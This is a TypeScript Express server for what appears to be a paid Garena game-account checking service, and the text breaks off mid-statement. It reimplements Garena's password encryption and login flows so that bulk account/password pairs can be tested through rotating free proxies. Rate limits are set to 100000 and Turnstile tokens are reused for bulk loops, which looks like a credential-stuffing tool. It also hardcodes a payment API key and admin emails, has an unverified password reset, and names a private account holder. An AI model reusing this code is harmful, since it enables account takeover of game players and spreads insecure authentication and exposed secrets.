import express from 'express';
import dotenv from 'dotenv';
dotenv.config({ override: true });

import path from 'path';
import cors from 'cors';
import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import crypto from 'node:crypto';
import { fileURLToPath } from 'url';
import https from 'node:https';
import tls from 'node:tls';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { spawn, ChildProcess } from 'child_process';
import WebSocket from 'ws';

import rateLimit from 'express-rate-limit';
import multer from 'multer';
import fs from 'fs';
import os from 'os';

// Automatic Free Proxy fetcher
let freeProxies: string[] = [];
let lastFreeProxyFetch = 0;

async function fetchFreeProxies() {
  const now = Date.now();
  // Fetch every 15 minutes to avoid rate limits
  if (now - lastFreeProxyFetch < 15 * 60 * 1000 && freeProxies.length > 0) return;
  lastFreeProxyFetch = now;
  try {
    const res = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all', { timeout: 10000 });
    if (typeof res.data === 'string') {
      const proxies = res.data.split('\n').map(p => p.trim()).filter(p => p.length > 5);
      if (proxies.length > 0) {
        freeProxies = proxies.map(p => `http://${p}`);
        console.log(`[Proxy] Fetched ${freeProxies.length} free proxies automatically.`);
      }
    }
  } catch (err: any) {
    console.error('[Proxy] Failed to fetch free proxies:', err.message);
  }
}

// Initial fetch
fetchFreeProxies();
setInterval(fetchFreeProxies, 15 * 60 * 1000);

import { adminDb as admin, supabaseAdmin } from './src/lib/admindb.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } }); // 20MB limit


import compression from 'compression';

console.log('[Server] --- Supabase VERSION REBOOT ---');
const app = express();
app.use(compression());
app.set('trust proxy', 1);
  const PORT = 3000;

const userTokenCache = new Map<string, { user: any, isAdmin: boolean, timestamp: number } | Promise<{ user: any, isAdmin: boolean, timestamp: number }>>();

  const injectUser = async (req: any, res: any, next: any) => {
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
      const token = authHeader.split('Bearer ')[1]?.trim();
      if (token && token !== 'null' && token !== 'undefined') {
        const now = Date.now();
        const cached = userTokenCache.get(token);
        
        if (cached) {
          if (cached instanceof Promise) {
            try {
              const result = await cached;
              req.user = result.user;
              req.isAdmin = result.isAdmin;
              return next();
            } catch (e) {
              // fall through and try again
            }
          } else if (now - cached.timestamp < 60000) {
            req.user = cached.user;
            req.isAdmin = cached.isAdmin;
            return next();
          }
        }

        const resolveAuth = async () => {
          let userObj = null;
          let isAdminObj = false;
          const { data: { user }, error } = await supabaseAdmin.auth.getUser(token);
          if (error) throw error;
          if (user) {
            userObj = user;
            (userObj as any).uid = user.id; // Map Supabase user.id to Firebase user.uid
            const adminEmails = [
              'abopboa.b@gmail.com',
              'admin_apex@apex-studio.com',
              'admin@apex-studio.com',
              'admin@admin.com',
              'apex@apex.com'
            ];
            if (adminEmails.includes(user.email || '')) {
              isAdminObj = true;
            } else {
              const userDoc = await admin.firestore().collection('users').doc(user.id).get();
              if (userDoc.exists) {
                const userData = typeof userDoc.data === 'function' ? userDoc.data() : null;
                isAdminObj = userData && typeof userData.role === 'string' && (userData.role.toLowerCase() === 'admin' || userData.role.toLowerCase() === 'owner');
              } else {
                isAdminObj = false;
              }
            }
          }
          return { user: userObj, isAdmin: isAdminObj, timestamp: Date.now() };
        };

        const authPromise = resolveAuth();
        userTokenCache.set(token, authPromise);

        try {
          const result = await authPromise;
          userTokenCache.set(token, result);
          if (result.user) {
            req.user = result.user;
            req.isAdmin = result.isAdmin;
          }
        } catch (error: any) {
          userTokenCache.delete(token);
          console.error('Error verifying ID token in injectUser:', error.message || error);
        }
      }
    }
    next();
  };

  const requireAuth = async (req: any, res: any, next: any) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Unauthorized: Missing or invalid token' });
    }
    next();
  };

  const requireAdmin = async (req: any, res: any, next: any) => {
    if (!req.user || !req.isAdmin) {
      console.error(`[AdminCheck] Access Denied for ${req.user?.email || 'Unknown'}. isAdmin: ${req.isAdmin}`);
      return res.status(403).json({ error: 'Forbidden: Admin access required. Please re-login.' });
    }
    next();
  };

  // API health check immediately
  app.get('/api/health', async (req, res) => {
    const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.ip || 'Unknown';
    console.log(`[Health] Request from ${clientIp}`);
    
    // Check if blocked bypassed for performance
    let isBlocked = false;
    
    res.json({ 
      status: 'ok', 
      time: new Date().toISOString(),
      env: process.env.NODE_ENV || 'development',
      clientIp: clientIp,
      blocked: isBlocked
    });
  });

  app.use(cors({
    origin: function (origin, callback) {
      // Allow requests with no origin (like mobile apps or curl requests)
      if (!origin) return callback(null, true);
      
      const allowedOrigins = [
        'https://apexcheck.space',
        'http://localhost:3000'
      ];
      
      // Allow cloud run domains dynamically
      if (origin.endsWith('.run.app') || allowedOrigins.indexOf(origin) !== -1) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true
  }));
  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ limit: '50mb', extended: true }));
  app.use(injectUser);

  app.post('/api/upload', requireAdmin, (req: any, res: any, next: any) => {
    upload.single('file')(req, res, (err) => {
      if (err) {
        console.error('Multer error:', err);
        return res.status(500).json({ error: 'Upload failed: ' + err.message });
      }
      next();
    });
  }, (req: any, res: any) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    const base64Data = req.file.buffer.toString('base64');
    const mimeType = req.file.mimetype;
    res.json({ url: `data:${mimeType};base64,${base64Data}` });
  });

  app.post('/api/community/upload', requireAuth, (req: any, res: any, next: any) => {
    upload.single('file')(req, res, (err) => {
      if (err) {
        console.error('Multer error:', err);
        return res.status(500).json({ error: 'Upload failed: ' + err.message });
      }
      next();
    });
  }, (req: any, res: any) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    const base64Data = req.file.buffer.toString('base64');
    const mimeType = req.file.mimetype;
    res.json({ url: `data:${mimeType};base64,${base64Data}` });
  });

  

  // Logging middleware for debugging
  app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
  });

  // Remove duplicate health check below
  // app.get('/api/health', (req, res) => { ... })
  
  // Site Settings State
  let lastStatsFetch = 0;
  let cachedStats: any = null;
  const invalidateStatsCache = () => { lastStatsFetch = 0; cachedStats = null; };
  let siteSettings: any = {
    site_name: process.env.VITE_SITE_NAME || 'APEX STUDIO',
    truewallet_phone: process.env.TRUEWALLET_PHONE || '',
    contact_line: process.env.CONTACT_LINE || '',
    stats_users_offset: 892,
    stats_sales_offset: 4432,
    popup_img_url: 'https://img2.pic.in.th/Red-Black-White-Anime-Podcast-Discord-Logocc6d3bfe807340af.png',
    popup_enabled: true,
    popup_link: '',
    banners: ["https://img2.pic.in.th/-71_20260516210303.png"],
    spotify_url: '',
    spotify_autoplay: false
  };

  // Load from DB
  try {
    const docName = process.env.NODE_ENV === 'production' ? 'site' : 'site_dev';
    admin.firestore().collection('settings').doc(docName).get().then((doc: any) => {
      if (doc.exists) {
        siteSettings = { ...siteSettings, ...doc.data() };
      }
    }).catch((err: any) => {
      console.warn("Could not load initial site settings from DB (might not exist yet).", err.message || err);
    });
  } catch(e) {}

  app.get('/api/settings', (req, res) => {
    res.json(siteSettings);
  });

  app.post('/api/reset-password', async (req, res) => {
    const { username, email, newPassword } = req.body;
    try {
      const generatedEmail = `${username.toLowerCase().replace(/\s+/g, '')}@apex-studio.com`;
      const usersSnapshot = await admin.firestore().collection('users')
        .where('email', '==', generatedEmail)
        .where('recoveryEmail', '==', email)
        .limit(1)
        .get();

      if (usersSnapshot.empty) {
        return res.status(404).json({ error: 'ไม่พบผู้ใช้นี้ หรือข้อมูลไม่ถูกต้อง' });
      }

      const userId = usersSnapshot.docs[0].id;
      const { error } = await supabaseAdmin.auth.admin.updateUserById(userId, {
        password: newPassword
      });

      if (error) {
        return res.status(400).json({ error: error.message });
      }

      res.json({ success: true });
    } catch (err: any) {
      res.status(500).json({ error: err.message || 'Internal error' });
    }
  });

  app.post('/api/signup', async (req, res) => {
    const { email, password, recoveryEmail } = req.body;
    try {
      const { data, error } = await supabaseAdmin.auth.admin.createUser({
        email,
        password,
        email_confirm: true
      });
      
      if (error) {
         return res.status(400).json({ error: error.message });
      }
      
      try {
        await admin.firestore().collection('users').doc(data.user.id).set({
          email,
          recoveryEmail: recoveryEmail || null,
          username: email.split('@')[0],
          balance: 0,
          role: 'user',
          status: 'active',
          updatedAt: new Date().toISOString()

        }, { merge: true });
      } catch (err: any) {
        console.error('Failed to create user doc:', err.message || err);
        if (err.details) console.error('Error Details:', err.details);
      }

      return res.json({ success: true, user: data.user });
    } catch (e: any) {
      return res.status(500).json({ error: String(e) });
    }
  });

  app.post('/api/settings', requireAdmin, async (req, res) => {
    console.log("=== POST /api/settings REACHED ===", req.body);
    const { truewallet_phone, site_name, contact_line, stats_users_offset, stats_sales_offset, stats_users_override, stats_stock_override, stats_sales_override, popup_img_url, popup_enabled, popup_link, banners, proxies, spotify_url, spotify_autoplay } = req.body;
    if (truewallet_phone !== undefined) siteSettings.truewallet_phone = truewallet_phone;
    if (site_name !== undefined) siteSettings.site_name = site_name;
    if (contact_line !== undefined) siteSettings.contact_line = contact_line;
    if (stats_users_offset !== undefined) siteSettings.stats_users_offset = parseInt(stats_users_offset) || 0;
    if (stats_sales_offset !== undefined) siteSettings.stats_sales_offset = parseInt(stats_sales_offset) || 0;
    if (stats_users_override !== undefined) siteSettings.stats_users_override = stats_users_override === null || isNaN(parseInt(stats_users_override)) ? null : parseInt(stats_users_override);
    if (stats_stock_override !== undefined) siteSettings.stats_stock_override = stats_stock_override === null || isNaN(parseInt(stats_stock_override)) ? null : parseInt(stats_stock_override);
    if (stats_sales_override !== undefined) siteSettings.stats_sales_override = stats_sales_override === null || isNaN(parseInt(stats_sales_override)) ? null : parseInt(stats_sales_override);
    if (popup_img_url !== undefined) siteSettings.popup_img_url = popup_img_url;
    if (popup_enabled !== undefined) siteSettings.popup_enabled = popup_enabled === true || popup_enabled === 'true';
    if (popup_link !== undefined) siteSettings.popup_link = popup_link;
    if (spotify_url !== undefined) siteSettings.spotify_url = spotify_url;
    if (spotify_autoplay !== undefined) siteSettings.spotify_autoplay = spotify_autoplay === true || spotify_autoplay === 'true';
    if (banners !== undefined && Array.isArray(banners)) siteSettings.banners = banners;
    if (proxies !== undefined && Array.isArray(proxies)) siteSettings.proxies = proxies;
    
    // Clear cached stats so they refresh next time someone calls /api/stats
    lastStatsFetch = 0;
    
    try {
      const docName = process.env.NODE_ENV === 'production' ? 'site' : 'site_dev';
      console.log(`[Settings] Attempting to save to DB doc: ${docName}`);
      await admin.firestore().collection('settings').doc(docName).set(siteSettings, { merge: true });
      console.log(`[Settings] Save Successful for ${docName}`);
    } catch(e: any) {
      console.error('[API/Settings] CRITICAL SAVE ERROR:', e);
      const errorDetail = e.message || e.details || JSON.stringify(e);
      return res.status(500).json({ 
        error: 'Failed to save settings to database',
        detail: errorDetail,
        doc: process.env.NODE_ENV === 'production' ? 'site' : 'site_dev'
      });
    }
    
    console.log(`[Settings] Updated:`, siteSettings);
    return res.json({ success: true, settings: siteSettings });
  });

  app.post('/api/topup/truemoney', async (req, res) => {
    try {
      const { voucherCode, uid } = req.body;
      const phone = siteSettings.truewallet_phone;
      
      if (!voucherCode) {
        return res.status(400).json({ success: false, error: 'กรุณากรอกลิงก์ซองของขวัญ' });
      }

      // Extract voucher hash from URL or use as is
      let voucherHash = voucherCode.trim();
      
      // If it's a full URL, extract from ?v= or &v=
      const urlMatch = voucherHash.match(/[?&]v=([^&#\s]+)/);
      if (urlMatch) {
        voucherHash = urlMatch[1];
      } else if (voucherHash.includes('truemoney.com')) {
        // Fallback for some links that might skip the 'v=' but contain hash in some way
        const parts = voucherHash.split('/');
        const lastPart = parts[parts.length - 1];
        if (lastPart && lastPart.length >= 10) {
          voucherHash = lastPart;
        }
      }
      
      // Final cleanup: just in case there's whitespace or extra chars
      voucherHash = voucherHash.replace(/[^a-zA-Z0-9]/g, '');

      console.log(`[TrueWallet] Attempting to redeem via XPLUEM: "${voucherHash}" for phone: ${phone}`);

      // Using the new API: https://api.xpluem.com/:link/:phone
      const response = await axios.get(`https://api.xpluem.com/${voucherHash}/${phone}`, {
          timeout: 15000,
          validateStatus: (status) => status < 500
      });

      const result = response.data;
      console.log(`[TrueWallet] XPLUEM Response:`, JSON.stringify(result));

      if (result.success === true) {
          const amount = parseFloat(result.data?.amount || 0);
          console.log(`[TrueWallet] Successfully redeemed ฿${amount}`);

          if (uid) {
            try {
              const userRef = admin.firestore().collection('users').doc(uid);
              const userDoc = await userRef.get();
              if (userDoc.exists) {
                const currentBalance = userDoc.data().balance || 0;
                await userRef.update({ balance: currentBalance + amount });
                console.log(`[TrueWallet] Updated balance for user ${uid} (+฿${amount})`);
                
                // Add to topups history
                await admin.firestore().collection('topups').add({
                  id: Math.random().toString(36).substring(7),
                  userId: userDoc.data().username || 'Unknown',
                  uid: uid,
                  amount: amount,
                  date: new Date().toISOString(),
                  type: 'truewallet',
                  money: amount,
                  title: 'เติมเงินสำเร็จ',
                  image: 'https://img1.pic.in.th/images/IMG_6162.png'
                });
              }
            } catch (syncErr) {
              console.error(`[TrueWallet] Balance sync error:`, syncErr);
            }
          }

          return res.json({ 
            success: true, 
            amount,
            message: result.message || 'รับเงินสำเร็จ'
          });
      } else {
          const errorMsg = result.message || 'ไม่สามารถรับเงินได้ (สถานะไม่สำเร็จ)';
          console.warn(`[TrueWallet] Failed: ${errorMsg}`);
          return res.json({ success: false, error: errorMsg });
      }
    } catch (error: any) {
        console.error("[TrueWallet] Gateway Error:", error.message);
        if (error.response) {
            const result = error.response.data;
            return res.json({ success: false, error: result?.message || 'เกิดข้อผิดพลาดในการเชื่อมต่อเซิร์ฟเวอร์ API' });
        }
        return res.status(500).json({ success: false, error: 'เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย' });
    }
  });

  const usedSlips = new Set<string>();

  app.post('/api/topup/slip', async (req, res) => {
    try {
      const { imageBase64, uid } = req.body;
      if (!imageBase64) {
        return res.status(400).json({ success: false, error: 'ข้อมูลไม่ครบถ้วน' });
      }

      const imageBuffer = Buffer.from(imageBase64, 'base64');
      const blob = new Blob([imageBuffer], { type: 'image/jpeg' });
      const form = new FormData();
      form.append('files', blob, 'slip.jpg');

      const response = await axios.post(
        'https://api.slipok.com/api/line/apikey/65331',
        form,
        {
          headers: {
            'x-authorization': 'SLIPOKA9ZEE71'
          }
        }
      );

      // Checking response format from SlipOK
      if (response.data.success === true || response.data.code === '0000' || response.data.data?.amount !== undefined) {
        const amount = response.data.data?.amount;
        const transRef = response.data.data?.transRef;
        const receiverProxy = response.data.data?.receiver?.proxy?.value || '';
        const receiverName = response.data.data?.receiver?.displayName || response.data.data?.receiver?.name || '';
        
        const EXPECTED_SHOP_NAME_1 = "ด.ช. กรวิชญ์ มาตขาว";
        const EXPECTED_SHOP_NAME_2 = "Master Korawit Makthaw";
        
        // ตรวจสอบชื่อบัญชีร้าน
        const isMatch = receiverName.includes(EXPECTED_SHOP_NAME_1) || 
                        receiverName.toUpperCase().includes(EXPECTED_SHOP_NAME_2.toUpperCase()) ||
                        receiverName.includes("กรวิชญ์");
        
        if (!isMatch) {
            return res.json({ 
              success: false, 
              error: `ชื่อบัญชีผู้รับเงินไม่สมบูรณ์ (สลิปโอนไปที่: ${receiverName || 'ไม่ระบุ'}) ไม่ตรงกับชื่อบัญชีของทางร้าน กรุณาติดต่อแอดมิน` 
            });
        }
        
        if (transRef) {
          // Check if used in DB
          try {
             const existingRef = await admin.firestore().collection('slips').doc(transRef).get();
             if (existingRef.exists) {
                return res.json({ success: false, error: 'สลิปนี้ถูกใช้งานไปแล้ว (ตรวจสอบจากระบบ)' });
             }
             await admin.firestore().collection('slips').doc(transRef).set({
               uid,
               amount,
               used_at: new Date().toISOString()
             });
          } catch(e) {
             // Fallback to local memory if DB fails
             if (usedSlips.has(transRef)) {
               return res.json({ success: false, error: 'สลิปนี้ถูกใช้งานไปแล้ว (local)' });
             }
             usedSlips.add(transRef);
          }
        }

        if (uid) {
          try {
            const userRef = admin.firestore().collection('users').doc(uid);
            const userDoc = await userRef.get();
            if (userDoc.exists) {
              const currentBalance = userDoc.data().balance || 0;
              await userRef.update({ balance: currentBalance + amount });
              console.log(`[Slip] Updated balance for user ${uid} (+฿${amount})`);
              
              // Add to topups history
              await admin.firestore().collection('topups').add({
                id: Math.random().toString(36).substring(7),
                userId: userDoc.data().username || 'Unknown',
                uid: uid,
                amount: amount,
                date: new Date().toISOString(),
                type: 'slip',
                money: amount,
                title: 'เติมเงินสำเร็จ',
                image: 'https://img2.pic.in.th/IMG_6166.png'
              });
            }
          } catch (syncErr) {
            console.error(`[Slip] Balance sync error:`, syncErr);
          }
        }

        return res.json({ success: true, amount });
      } else {
        const errorMsg = response.data.data?.message || response.data.message;
        return res.json({ success: false, error: errorMsg || 'ไม่สามารถรับเงินได้' });
      }
    } catch (error: any) {
        if (error.response) {
            const errorMsg = error.response.data?.message;
            return res.json({ success: false, error: errorMsg || 'สลิปไม่ถูกต้อง หรือถูกใช้งานไปแล้ว' });
        } else {
            console.error("SlipOK API Error:", error.message);
            return res.status(500).json({ success: false, error: 'เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย' });
        }
    }
  });

  app.post('/api/verify_turnstile', async (req, res) => {
    try {
      const { token } = req.body;
      const secretKey = process.env.TURNSTILE_SECRET_KEY || '';

      if (!secretKey) {
          return res.json({ success: true, message: "Bypassed missing Turnstile Secret Key." });
      }

      console.log('Verify Turnstile called with token:', token);
      
      if (!token) {
        return res.status(400).json({ success: false, error: 'Token missing' });
      }

      const params = new URLSearchParams();
      params.append('secret', secretKey);
      params.append('response', token);

      const response = await axios.post(
        'https://challenges.cloudflare.com/turnstile/v0/siteverify',
        params.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true
        }
      );

      console.log('Turnstile Response:', response.data);
      
      if (!response.data.success) {
        return res.status(403).json(response.data);
      }
      return res.json(response.data);
    } catch (error: any) {
      console.error('Turnstile verification error:', error.message || error);
      return res.status(500).json({ success: false, error: 'Internal server error', detail: error.message });
    }
  });

    // --- Precise Garena Checking Logic using node:crypto ---
  
  const getMD5 = (text: string) => {
    let raw = text;
    try {
      if (text.includes('%')) {
        raw = decodeURIComponent(text);
      }
    } catch (e) {}
    return crypto.createHash('md5').update(raw).digest('hex');
  };

  const encryptPassword = (password: string, v1: string, v2: string) => {
    const passMd5 = getMD5(password);
    const innerHash = crypto.createHash('sha256').update(passMd5 + v1).digest('hex');
    const outerHash = crypto.createHash('sha256').update(innerHash + v2).digest('hex');
    const key = Buffer.from(outerHash, 'hex');
    const plaintext = Buffer.from(passMd5, 'hex');
    const cipher = crypto.createCipheriv('aes-256-ecb', key, null);
    cipher.setAutoPadding(false);
    let encrypted = cipher.update(plaintext);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted.toString('hex').substring(0, 32);
  };

  const getCodmInfo = async (client: any) => {
    try {
      const random_id = Date.now().toString();
      const token_url = "https://auth.garena.com/oauth/token/grant";
      const token_data = `client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=${random_id}`;
      
      const token_res = await client.post(token_url, token_data, {
        headers: {
          "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
          "Pragma": "no-cache",
          "Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
      });
      
      const access_token = token_res.data?.access_token;
      if (!access_token) return null;

      // Callback to CODM
      const codm_callback_url = `https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token=${access_token}`;
      await client.get(codm_callback_url, { 
        maxRedirects: 0, 
        validateStatus: (s: number) => s < 400,
        headers: {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
      });

      // API callback
      const api_callback_url = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${access_token}`;
      const api_callback_res = await client.get(api_callback_url, { 
        maxRedirects: 0, 
        validateStatus: (s: number) => s < 400,
        headers: {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
      });
      
      const location = api_callback_res.headers['location'] || '';

      if (location.includes("err=3")) return null;
      if (location.includes("token=")) {
        const token = location.split("token=")[1].split('&')[0];
        const check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/";
        const check_res = await client.get(check_login_url, {
          headers: {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v=\"24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
          }
        });
        
        const user_data = check_res.data?.user;
        if (user_data) {
          const region_code = user_data.region || "N/A";
          // Basic CODM Region mappings from python code
          const codm_regions: any = {
            'PH': { 'name': 'Philippines', 'flag': '🇵🇭' },
            'ID': { 'name': 'Indonesia', 'flag': '🇮🇩' },
            'HK': { 'name': 'Hong Kong', 'flag': '🇭🇰' },
            'MY': { 'name': 'Malaysia', 'flag': '🇲🇾' },
            'TW': { 'name': 'Taiwan', 'flag': '🇹🇼' },
            'TH': { 'name': 'Thailand', 'flag': '🇹🇭' },
            'SG': { 'name': 'Singapore', 'flag': '🇸🇬' },
          };
          const rinfo = codm_regions[region_code] || {};
          
          return {
            nickname: user_data.codm_nickname || 'N/A',
            level: user_data.codm_level || 'Unknown',
            region: region_code,
            region_name: rinfo.name || 'Unknown',
            region_flag: rinfo.flag || '🏳️',
            uid: user_data.uid || 'N/A',
            open_id: user_data.open_id || 'N/A',
            t_open_id: user_data.t_open_id || 'N/A'
          };
        }
      }
    } catch (e) {
      // console.error("CODM Info Fetch Error:", e.message);
    }
    return null;
  };

  const getGameConnections = async (client: any) => {
    const game_info: string[] = [];
    const valid_regions = ['sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'];
    
    const game_mappings: any = {
      'tw': {
          "100082": "CODM",
          "100067": "FREE FIRE",
          "100070": "SPEED DRIFTERS",
          "100130": "BLACK CLOVER M",
          "100105": "GARENA UNDAWN",
          "100050": "ROV",
          "100151": "DELTA FORCE",
          "100147": "FAST THRILL",
          "100107": "MOONLIGHT BLADE"
      },
      'th': {
          "100067": "FREEFIRE",
          "100055": "ROV",
          "100082": "CODM",
          "100151": "DELTA FORCE",
          "100105": "GARENA UNDAWN",
          "100130": "BLACK CLOVER M",
          "100070": "SPEED DRIFTERS",
          "32836": "FC ONLINE",
          "100071": "FC ONLINE M",
          "100124": "MOONLIGHT BLADE"
      },
      'vn': {
          "32837": "FC ONLINE",
          "100072": "FC ONLINE M",
          "100054": "ROV",
          "100137": "THE WORLD OF WAR"
      },
      'default': {
          "100082": "CODM",
          "100067": "FREEFIRE",
          "100151": "DELTA FORCE",
          "100105": "GARENA UNDAWN",
          "100057": "AOV",
          "100070": "SPEED DRIFTERS",
          "100130": "BLACK CLOVER M",
          "100055": "ROV"
      }
    };

    try {
      const token_url = "https://authgop.garena.com/oauth/token/grant";
      const token_data = `client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id=${Date.now()}`;
      const token_res = await client.post(token_url, token_data, {
        headers: { 
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
          "Content-Type": "application/x-www-form-urlencoded" 
        }
      });
      const access_token = token_res.data.access_token;
      if (!access_token) return [];

      const inspect_url = "https://shop.garena.sg/api/auth/inspect_token";
      const inspect_res = await client.post(inspect_url, { token: access_token }, {
          headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
              "Content-Type": "application/json"
          }
      });

      const session_key_roles = inspect_res.headers['set-cookie']?.find((c: string) => c.startsWith('session_key='))?.split(';')[0]?.split('=')[1] || inspect_res.cookies?.session_key;
      
      const uac = (inspect_res.data.uac || "ph").toLowerCase();
      const region = valid_regions.includes(uac) ? uac : 'ph';
      
      let base_domain = `shop.garena.${region}`;
      if (region === 'th' || region === 'in') base_domain = "termgame.com";
      else if (region === 'id') base_domain = "kiosgamer.co.id";
      else if (region === 'vn') base_domain = "napthe.vn";

      const applicable_games = game_mappings[region] || game_mappings['default'];
      for (const [app_id, game_name] of Object.entries(applicable_games)) {
        try {
          const roles_res = await client.get(`https://${base_domain}/api/shop/apps/roles`, {
            params: { app_id },
            headers: {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Accept': "application/json, text/plain, */*",
                'Accept-Language': "en-US,en;q=0.5",
                'Connection': "keep-alive",
                'Referer': `https://${base_domain}/?app=${app_id}`,
                'Sec-Fetch-Dest': "empty",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Site': "same-origin",
                'Cookie': session_key_roles ? `session_key=${session_key_roles}` : ''
            }
          });
          const roles_data = roles_res.data;
          let role = null;
          if (Array.isArray(roles_data.role) && roles_data.role.length > 0) role = roles_data.role[0];
          else if (roles_data[app_id] && Array.isArray(roles_data[app_id]) && roles_data[app_id].length > 0) role = roles_data[app_id][0].role;

          if (role) game_info.push(`[${region.toUpperCase()} - ${game_name} - ${role}]`);
        } catch (e) {}
      }
      
      if (game_info.length === 0) {
          game_info.push(`[${region.toUpperCase()} - No Game Detected]`);
      }
    } catch (e) {}
    return game_info;
  };

  // Add RateLimiting to prevent bot attacks
  const checkLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100000, 
    standardHeaders: true, 
    legacyHeaders: false, 
    validate: { xForwardedForHeader: false, trustProxy: false },
    message: { error: 'ขออภัย คุณส่งคำร้องขอเยอะเกินไป (Anti-Bot Protection) กรุณารอสักครู่' }
  });

  const globalLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, 
    max: 100000, 
    standardHeaders: true,
    legacyHeaders: false,
    validate: { xForwardedForHeader: false, trustProxy: false },
    message: { error: 'Too many requests, please try again later.' }
  });

  app.use('/api/', globalLimiter);

  // Cache for Turnstile tokens (since they are single-use against Cloudflare, but we need them for a bulk loop)
  const turnstileCache = new Map<string, number>();

  app.post('/api/check', checkLimiter, async (req, res) => {
    const account = req.body.account?.toString().trim();
    const password = req.body.password?.toString().trim();
    const turnstileToken = req.body.turnstileToken; // Optional turnstile token
    const apiKey = req.headers['x-api-key']?.toString().trim() || req.body.apiKey?.toString().trim();

    if (!account || !password) return res.status(400).json({ error: 'Missing credentials' });

    let isApiKeyValid = false;
    if (apiKey) {
      if (!admin.firestore()) {
        return res.status(500).json({ error: 'Database connection error' });
      }
      try {
        const apiKeyDoc = await admin.firestore().collection('api_keys').doc(apiKey).get();
